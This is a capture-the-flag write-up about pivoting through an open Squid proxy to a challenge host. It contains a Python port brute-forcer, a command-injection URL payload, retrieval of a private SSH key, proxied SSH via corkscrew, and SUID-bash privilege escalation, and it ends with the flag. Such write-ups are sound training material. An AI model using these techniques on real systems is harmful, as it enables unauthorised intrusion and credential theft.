# Permission to Proxy

![image](https://github.com/user-attachments/assets/81021240-3a62-46b5-8cd5-dae47ab36255)

## My Solution

When accessing the webpage we get an Invalid URL error and at the bottom we can see it mentioning `squid 3.5.27`.  

![image](https://github.com/user-attachments/assets/5180ad20-a17c-4387-96b6-1852cb12f3ec)

Squid is a proxy and this part was very annoying as we needed to bruteforce an internal port. Squid can be used to figure out internal ports by using it with curl, for example:

```bash
curl --proxy http://challenge.ctf.games:PORT http://127.0.0.1:22
```

In the case of a valid port found like port 22, we get the server banner, or whatever response the service normally gives.  

![image](https://github.com/user-attachments/assets/50169ab0-8ba0-43b6-ac43-c8de501ba80f)

Otherwise we get one of the following 3 errors, ERR_CONNECT_FAIL, ERR_ACCESS_DENIED, or ERR_INVALID_URL:  

The squid proxy can also be used with python requests, this is the way I figured to bruteforce it in a relatively short amount of time.  


```python3
#!/usr/bin/python3

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

def check_port(i):
    stdout_output = ""  # Initialize stdout_output
    try:
        print(i, flush=True, end='\r')
        r = requests.get(f'http://127.0.0.1:{i}', proxies={'http': 'http://challenge.ctf.games:31199'}, timeout=5)
        stdout_output = r.text
        
        # Check for various connection messages
        if "ERR_CONNECT_FAIL" not in stdout_output and 'ERR_ACCESS_DENIED' not in stdout_output and 'ERR_INVALID_URL' not in stdout_output:
            print(f"Found something on port: {i}")
            print(stdout_output)
    except:
        print(f"The request timed out on port {i}. Look at it separately.")
        exit(1)

# Define the range and maximum number of concurrent threads
port_range = range(65536)
max_threads = 10

# Use ThreadPoolExecutor to handle concurrent requests
with ThreadPoolExecutor(max_workers=max_threads) as executor:
    # Submit tasks for each port and capture the results
    futures = [executor.submit(check_port, i) for i in port_range]
    # Process the results as they complete
    for future in as_completed(futures):
        future.result()  
```
It took the script 24 minutes to find port `50000` as it was hanging the connection and timing out. If there are faster ways, let me know [@LazyTitan33](https://x.com/LazyTitan33)  

![image](https://github.com/user-attachments/assets/bf9ca3d5-632b-471d-a33f-0bef02184c0c)

When we access it using curl, we can see it is listing directories and is trying to execute basically everything and it hangs:  

![image](https://github.com/user-attachments/assets/74aded1a-118e-47ea-bc9b-4b6f94b81090)

Tried to see if I have command injection in the URL itself, in the endpoint, and we do:  

```bash
curl --proxy http://challenge.ctf.games:32381 'http://127.0.0.1:50000/;id;test'
```

![image](https://github.com/user-attachments/assets/662cf062-d0bd-4c21-8fd3-aa2ea45688c2)


Enumerating for a bit I quickly found the user id_rsa private key and saved it:  

![image](https://github.com/user-attachments/assets/945e5507-104f-4789-bc22-6dd0909d6d1c)


Using [corkscrew](https://github.com/bryanpkc/corkscrew) I can proxy an SSH connection as well and get proper shell:  

```bash
ssh -i id_rsa -o "ProxyCommand /usr/bin/corkscrew challenge.ctf.games 30351  %h %p" user@127.0.0.1
```

Ran linpeas and quickly saw that bash has SUID on so escalating privileges is a breeze:  

![image](https://github.com/user-attachments/assets/3cfe8c3a-afe0-4de2-8d68-bf3ca15cb63e)

And we get the flag:  

![image](https://github.com/user-attachments/assets/9dfc36b7-7539-434e-9264-116a21a275d0)

`flag{c9bbd4888086111e9f632d4861c103f1}`

